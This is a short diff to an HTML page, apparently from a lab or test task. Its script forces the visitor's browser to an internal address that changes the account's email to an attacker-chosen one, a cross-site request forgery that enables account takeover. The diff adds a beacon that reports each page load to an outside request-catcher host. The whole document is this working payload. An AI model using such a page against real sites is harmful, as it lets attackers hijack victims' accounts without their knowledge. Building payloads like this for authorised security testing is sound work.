@@ -9,6 +9,12 @@
     <script>
       location.href =
         "http://100.101.228.35:6009/settings/email?new=freshemail@example.com";
+
+      const catcher = "https://tpas-task3-test.requestcatcher.com";
+
+      const beacon = new Image();
+
+      beacon.src = catcher + "/page-loaded?time=" + Date.now();
     </script>
   </body>
 </html>
